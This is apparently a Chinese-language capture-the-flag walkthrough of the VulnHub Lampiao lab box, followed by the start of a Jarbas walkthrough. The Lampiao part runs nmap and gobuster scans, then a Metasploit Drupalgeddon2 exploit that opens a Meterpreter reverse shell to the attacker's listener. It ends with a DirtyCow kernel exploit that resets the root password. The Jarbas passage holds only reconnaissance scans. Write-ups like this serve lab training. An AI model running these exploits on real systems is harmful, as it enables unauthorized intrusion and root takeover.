class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sU -p22,80,1898 192.168.2.10 -oA nmapscan/udp                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 10:29 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.10<br>Host is up (0.00095s latency).<br><br>PORT     STATE  SERVICE<br>22/udp   closed ssh<br>80/udp   closed http<br>1898/udp closed cymtec-port<br>MAC Address: 08:00:27:62:07:F9 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.49 seconds<br></code></pre></td></tr></table></figure></li><li>没有开放的udp端口<br>（4）进行漏洞扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p22,80,1898 192.168.2.10 -oA nmapscan/vuln<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 10:29 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.10<br>Host is up (0.0012s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)<br>|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">1898/tcp open  cymtec-port</span><br><span class="hljs-string">MAC Address: 08:00:27:62:07:F9 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 49.75 seconds</span><br></code></pre></td></tr></table></figure></li><li>没有扫描出漏洞</li></ul><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>（1）访问80端口，是一个静态页面，查看页面源码，没有发现有用的信息<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081035901.png"><br>（2）进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.10 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.10<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br><br>Error: error on running gobuster: unable to connect to http://192.168.2.10/: Get <span class="hljs-string">&quot;http://192.168.2.10/&quot;</span>: <span class="hljs-built_in">read</span> tcp 192.168.2.4:38794-&gt;192.168.2.10:80: <span class="hljs-built_in">read</span>: connection reset by peer<br></code></pre></td></tr></table></figure><ul><li>发现无法连接到80端口</li></ul><h2 id="1898端口渗透"><a href="#1898端口渗透" class="headerlink" title="1898端口渗透"></a>1898端口渗透</h2><p>（1）访问1898端口，发现使用的cms是<code>drupal</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081051355.png"><br>（2）对1898端口进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.10:1898 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.10:1898<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 286]<br>/.php                 (Status: 403) [Size: 285]<br>/misc                 (Status: 301) [Size: 317] [--&gt; http://192.168.2.10:1898/misc/]<br>/themes               (Status: 301) [Size: 319] [--&gt; http://192.168.2.10:1898/themes/]<br>/modules              (Status: 301) [Size: 320] [--&gt; http://192.168.2.10:1898/modules/]<br>/scripts              (Status: 301) [Size: 320] [--&gt; http://192.168.2.10:1898/scripts/]<br>/index.php            (Status: 200) [Size: 11400]<br>/sites                (Status: 301) [Size: 318] [--&gt; http://192.168.2.10:1898/sites/]<br>/includes             (Status: 301) [Size: 321] [--&gt; http://192.168.2.10:1898/includes/]<br>/profiles             (Status: 301) [Size: 321] [--&gt; http://192.168.2.10:1898/profiles/]<br>/update.php           (Status: 403) [Size: 4129]<br>/install.php          (Status: 200) [Size: 3257]<br>/robots.txt           (Status: 200) [Size: 2189]<br>/cron.php             (Status: 403) [Size: 7390]<br>/xmlrpc.php           (Status: 200) [Size: 42]<br>/.php                 (Status: 403) [Size: 285]<br>/.html                (Status: 403) [Size: 286]<br>/server-status        (Status: 403) [Size: 294]<br>/authorize.php        (Status: 403) [Size: 2896]<br>Progress: 830572 / 830576 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><ul><li><p>发现挺多的敏感文件，访问<code>robots.txt</code>，找到<code>CHANGELOG.txt</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081102193.png"></p></li><li><p>发现该框架<code>drupal</code>的版本信息为<code>7.54</code>，时间为2017年2月1日<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081102339.png"></p></li></ul><h2 id="cms-drupal渗透"><a href="#cms-drupal渗透" class="headerlink" title="cms-drupal渗透"></a>cms-drupal渗透</h2><p>（1）通过上述的渗透，最终确认该系统使用的CMS是<code>drupal</code>，版本为<code>7.54</code>，时间为<code>2017-02-01</code>，通过Google搜索17年以后的漏洞或者使用msf进行搜索</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ msfconsole    <br>Metasploit tip: Use the edit <span class="hljs-built_in">command</span> to open the currently active module <br><span class="hljs-keyword">in</span> your editor<br>                                                  <br><span class="hljs-comment"># cowsay++</span><br> ____________<br>&lt; metasploit &gt;<br> ------------<br>       \   ,__,<br>        \  (oo)____<br>           (__)    )\<br>              ||--|| *<br><br><br>       =[ metasploit v6.4.20-dev                          ]<br>+ -- --=[ 2440 exploits - 1256 auxiliary - 429 post       ]<br>+ -- --=[ 1471 payloads - 47 encoders - 11 nops           ]<br>+ -- --=[ 9 evasion                                       ]<br><br>Metasploit Documentation: https://docs.metasploit.com/<br><br>msf6 &gt; search drupal<br><br>Matching Modules<br>================<br><br>   <span class="hljs-comment">#   Name                                                              Disclosure Date  Rank       Check  Description</span><br>   -   ----                                                              ---------------  ----       -----  -----------<br>   0   exploit/unix/webapp/drupal_coder_exec                             2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution<br>   1   exploit/unix/webapp/drupal_drupalgeddon2                          2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection<br>   2     \_ target: Automatic (PHP In-Memory)                            <br>   3     \_ target: Automatic (PHP Dropper)                              <br>   4     \_ target: Automatic (Unix In-Memory)                           <br>   5     \_ target: Automatic (Linux Dropper)                            <br>   6     \_ target: Drupal 7.x (PHP In-Memory)                           <br>   7     \_ target: Drupal 7.x (PHP Dropper)                             <br>   8     \_ target: Drupal 7.x (Unix In-Memory)                          <br>   9     \_ target: Drupal 7.x (Linux Dropper)                           <br>   10    \_ target: Drupal 8.x (PHP In-Memory)                           <br>   11    \_ target: Drupal 8.x (PHP Dropper)                             <br>   12    \_ target: Drupal 8.x (Unix In-Memory)                          <br>   13    \_ target: Drupal 8.x (Linux Dropper)                           <br>   14    \_ AKA: SA-CORE-2018-002                                        <br>   15    \_ AKA: Drupalgeddon 2                                          <br>   16  exploit/multi/http/drupal_drupageddon                             2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection<br>   17    \_ target: Drupal 7.0 - 7.31 (form-cache PHP injection method)  <br>   18    \_ target: Drupal 7.0 - 7.31 (user-post PHP injection method)   <br>   19  auxiliary/gather/drupal_openid_xxe                                2012-10-17       normal     Yes    Drupal OpenID External Entity Injection<br>   20  exploit/unix/webapp/drupal_restws_exec                            2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution<br>   21  exploit/unix/webapp/drupal_restws_unserialize                     2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE<br>   22    \_ target: PHP In-Memory                                        <br>   23    \_ target: Unix In-Memory                                       <br>   24  auxiliary/scanner/http/drupal_views_user_enum                     2010-07-02       normal     Yes    Drupal Views Module Users Enumeration<br>   25  exploit/unix/webapp/php_xmlrpc_eval                               2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution<br><br>Interact with a module by name or index. For example info 25, use 25 or use exploit/unix/webapp/php_xmlrpc_eval<br><br></code></pre></td></tr></table></figure><p>（2）结合搜集到信息，选择<code>drupal_drupalgeddon2 2018-03-28</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2<br>[*] No payload configured, defaulting to php/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><p>（3）进行相关的设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="hljs-built_in">set</span> lhost 192.168.2.4<br>lhost =&gt; 192.168.2.4<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="hljs-built_in">set</span> rhost 192.168.2.10<br>rhost =&gt; 192.168.2.10<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="hljs-built_in">set</span> rport 1898<br>rport =&gt; 1898<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show option<br>sf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.2.4:4444 <br>[*] Running automatic check (<span class="hljs-string">&quot;set AutoCheck false&quot;</span> to <span class="hljs-built_in">disable</span>)<br>[+] The target is vulnerable.<br>[*] Sending stage (39927 bytes) to 192.168.2.10<br>[*] Meterpreter session 1 opened (192.168.2.4:4444 -&gt; 192.168.2.10:45742) at 2025-02-08 11:20:51 +0800<br><br>meterpreter &gt; <br></code></pre></td></tr></table></figure><p>（4）输入<code>shell</code>，成功进行连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; shell<br>Process 4974 created.<br>Channel 0 created.<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><p>（5）获取稳定的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>www-data@lampiao:/var/www/html$ <br></code></pre></td></tr></table></figure><h1 id="提权-dirtycow"><a href="#提权-dirtycow" class="headerlink" title="提权-dirtycow"></a>提权-dirtycow</h1><p>（1）使用脚本<code>linux-exploit-suggester.sh</code>进行提权，将脚本上传至临时目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; upload /miao/vulnhub/lampiao/linux-exploit-suggester.sh /tmp/1.sh<br>[*] Uploading  : /miao/vulnhub/lampiao/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>[*] Uploaded -1.00 B of 88.80 KiB (-0.0%): /miao/vulnhub/lampiao/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>[*] Completed  : /miao/vulnhub/lampiao/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>meterpreter &gt; <br></code></pre></td></tr></table></figure><p>（2）进行命令交互界面，给脚本添加执行权限，并执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; shell<br>Process 5651 created.<br>Channel 2 created.<br>python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>www-data@lampiao:/var/www/html$ <span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">cd</span> /tmp<br>www-data@lampiao:/tmp$ <span class="hljs-built_in">chmod</span> +x 1.sh    <br><span class="hljs-built_in">chmod</span> +x 1.sh<br>www-data@lampiao:/tmp$ ./1.sh<br>./1.sh<br></code></pre></td></tr></table></figure><p>（3）根据执行的结果，选择相关的漏洞进行利用（一般选择有颜色的进行利用）<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081139012.png"><br>（4）选择<code>CVE-2016-5195</code>进行利用</p><ul><li>利用脚本：<a href="https://github.com/gbonacini/CVE-2016-5195%EF%BC%8C%E5%B0%86%E8%84%9A%E6%9C%AC%E4%B8%8A%E4%BC%A0%E8%87%B3%E7%9B%AE%E5%BD%95/tmp">https://github.com/gbonacini/CVE-2016-5195，将脚本上传至目录/tmp</a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; upload /miao/vulnhub/lampiao/CVE-2016-5195-master/ /tmp/<br><br></code></pre></td></tr></table></figure></li><li>对<code>dcow.cpp</code>进行编译<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil<br></code></pre></td></tr></table></figure>（5）执行<code>dcow</code>，对密码进行重置<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@lampiao:/tmp$ ./dcow<br>./dcow<br>Running ...<br>Received su prompt (Password: )<br>Root password is:   dirtyCowFun<br>Enjoy! :-)<br></code></pre></td></tr></table></figure>（6）切换到<code>root</code>用户<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@lampiao:/tmp$ su root<br>su root<br>Password: dirtyCowFun<br><br>root@lampiao:/tmp#<br></code></pre></td></tr></table></figure></li></ul><p><strong>读取flag</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@lampiao:~# <span class="hljs-built_in">cat</span> /root/flag.txt<br><span class="hljs-built_in">cat</span> /root/flag.txt<br>9740616875908d91ddcdaa8aea3af366<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>（1）主要是对CMS，drupal的漏洞进行利用以及如何使用msf<br>（2）dirtrydcow提权的方法，主要是对root的密码进行重置<br>（3）使用python获取稳定的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cms-drupal</tag>
      
      <tag>提权-dirtycow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jarbas</title>
    <link href="/Vulnhub/Jarbas/"/>
    <url>/Vulnhub/Jarbas/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://www.vulnhub.com/entry/jarbas-1,232/">https://www.vulnhub.com/entry/jarbas-1,232/</a></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Jarbas]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.2.0/24 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 09:07 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00015s latency).<br>MAC Address: 0A:00:27:00:00:52 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00027s latency).<br>MAC Address: 08:00:27:32:09:17 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.3<br>Host is up (0.00072s latency).<br>MAC Address: 08:00:27:42:06:E4 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.00 seconds<br><br></code></pre></td></tr></table></figure><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>（1）进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Jarbas]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT --min-rate 10000 -p- 192.168.2.3 -oA nmapscan/ports<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 09:04 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.3<br>Host is up (0.00044s latency).<br>Not shown: 65531 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>3306/tcp open  mysql<br>8080/tcp open  http-proxy<br>MAC Address: 08:00:27:42:06:E4 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 1.68 seconds<br></code></pre></td></tr></table></figure><p>发现靶机开放<code>22,80,3306,8080</code>端口<br>（2）对端口细节进行扫描<br>    用TCP扫描（-sT）查看其服务版本（-sV）和操作系统（-O）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Jarbas]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p22,80,3306,8080  192.168.2.3 -oA nmapscan/detail <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 09:05 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.3<br>Host is up (0.00059s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)<br>80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/<span class="hljs-number">5.4</span>.<span class="hljs-number">16</span>)<br><span class="hljs-number">3306</span>/tcp open  mysql   MariaDB (unauthorized)<br><span class="hljs-number">8080</span>/tcp open  http    Jetty <span class="hljs-number">9.4</span>.z-SNAPSHOT<br>MAC Address: <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">27</span>:<span class="hljs-number">42</span>:<span class="hljs-number">06</span>:E4 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least <span class="hljs-number">1</span> open and <span class="hljs-number">1</span> closed port<br>Device type: general purpose<br>Running: Linux <span class="hljs-number">3</span>.X|<span class="hljs-number">4</span>.X<br>OS CPE: cpe:/o:linux:linux_kernel:<span class="hljs-number">3</span> cpe:/o:linux:linux_kernel:<span class="hljs-number">4</span><br>OS details: Linux <span class="hljs-number">3.2</span> - <span class="hljs-number">4.9</span><br>Network Distance: <span class="hljs-number">1</span> hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">7.67</span> seconds<br></code></pre></td></tr></table></figure><p>（2）对端口进行UDP扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Jarbas]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sU -p22,80,3306,8080 192.168.2.3 -oA nmapscan/udp<br>[<span class="hljs-built_in">sudo</span>] kali 的密码：<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 09:13 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.3<br>Host is up (0.00030s latency).<br><br>PORT     STATE  SERVICE<br>22/udp   closed ssh<br>80/udp   closed http<br>3306/udp closed mysql<br>8080/udp closed http-alt<br>MAC Address: 08:00:27:42:06:E4 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 0.46 seconds<br></code></pre></td></tr></table></figure><p>发现UDP端口全部关闭<br>（3）进行漏洞扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code 